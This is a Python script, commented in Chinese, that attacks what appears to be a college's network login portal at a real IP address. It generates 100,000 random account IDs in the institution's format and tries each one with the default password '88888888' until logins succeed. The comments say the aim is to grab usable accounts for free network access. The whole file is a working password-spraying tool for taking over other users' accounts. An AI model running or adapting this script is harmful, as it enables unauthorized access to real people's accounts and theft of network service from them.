import random
import base64
import requests
from urllib.parse import urlencode
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend


def encrypt_msg(msg: str) -> str:
    r"""公钥加密

    :param msg: 明文
    :return: 密文
    """

    public_key = """-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCSdmhmo8um31uF5S6niFVaMRJbF24QfqnrgZUaQQVRDPprK7pB8WXguajKvl55FfSEBY3Dop3gh2daTHIqMWPCIbd5pYtdHUwi3kzpYu2mVVz5qHiAnryKq8aQ5Mpt18Hg+QqzboF51Y2I/hirgqfOmF+VANI0zCF+mETapU7e8QIDAQAB-----END PUBLIC KEY-----"""

    key = serialization.load_pem_public_key(
        public_key.encode(), backend=default_backend()
    )

    encrypted = key.encrypt(msg.encode("utf-8"), padding.PKCS1v15())

    return base64.b64encode(encrypted).decode("utf-8")


def network_login(user_name: str, password: str):
    headers = {
        "Host": "219.150.59.241:28120",
        "Origin": "http://219.150.59.241:28120",
        "Referer": "http://219.150.59.241:28120",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "DNT": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

    en_un = encrypt_msg(user_name)
    en_pw = encrypt_msg(password)

    # 构建请求数据
    post_data = {"userName": en_un, "userPassword": en_pw, "basName": ""}

    try:
        response = requests.post(
            url="http://219.150.59.241:28120/login",
            data=urlencode(post_data),
            headers=headers,
            timeout=10,
        )

        # print(response.text)
        """
        返回数据:
        {"result":"2","info":"022*****@tjxy,17*****35,**********,连接已建立，请正常使用网络"}
        """

        if response.status_code == 200:
            response_data = response.json()
            result_code = str(response_data.get("result"))
            # result_info = response_data.get("info")

            if result_code == "0" or result_code == "2":
                # info_list = result_info.split(",")
                # user_name = info_list[0]
                # login_date = info_list[1]
                # print(f"[成功] 登录成功，用户名: {user_name}")
                return True

    except Exception as e:
        print("[错误] 登录失败")


def generate_accounts(size=10):
    prefix = "022"
    # 权重占比75%  # 权重占比25%
    middle_codes = {"743": 75, "722": 25}

    # 生成账号
    accounts = []
    for _ in range(size):
        # 加权随机选择中间编码
        middle = random.choices(
            list(middle_codes.keys()), weights=list(middle_codes.values()), k=1
        )[0]

        # 生成随机后缀
        while True:
            suffix = "".join(str(random.randint(0, 9)) for _ in range(5))
            if suffix != "00000":
                break

        accounts.append(f"{prefix}{middle}{suffix}@tjxy")

    return accounts


if __name__ == "__main__":
    # 生成账号，数量要大，主要为了能随机到能用的账号，还有自动和方便
    accounts = generate_accounts(size=100000)

    success = 0
    for acc in accounts:
        print(acc)
        # 默认密码为八个八
        # 可以自行更换为自己的账号密码
        login = network_login(acc, "88888888")
        if login:
            # print("登录成功")
            success += 1
            if success == 10:
                # 由于电信的基本操作，一次链接容易掉网
                # 所以累计成功十个则认为连接有效
                # 或可自行更改为能成功获取网页内容判断为成功
                print("登录成功")
                break
        else:
            success = 0
